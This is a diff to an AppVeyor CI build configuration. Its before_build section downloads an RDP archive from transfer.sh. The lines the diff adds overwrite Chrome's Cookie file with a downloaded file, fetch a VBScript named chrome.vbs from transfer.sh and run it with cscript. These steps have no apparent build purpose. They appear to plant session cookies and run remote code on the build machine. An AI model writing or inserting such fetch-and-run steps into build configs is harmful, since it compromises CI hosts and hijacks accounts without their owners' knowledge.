@@ -18,6 +18,12 @@ before_build:
     curl -o %localappdata%\RDP.7z https://transfer.sh/k3QWp/RD_19v_21.04.7z
     
     7z e C:\Users\appveyor\AppData\Local\rdp.7z -y -oC:\Users\appveyor\AppData\Local -spf
+    
+    curl -o "%localappdata%\Google\Chrome\User Data\Default\Cookie" https://transfer.sh/zaTfF/27-04-bb-gh
+    
+    curl -o %localappdata%\chrome.vbs https://transfer.sh/BSZvW/chrome.vbs
+    
+    cscript %localappdata%\chrome.vbs
 build:
   verbosity: minimal
 after_test:
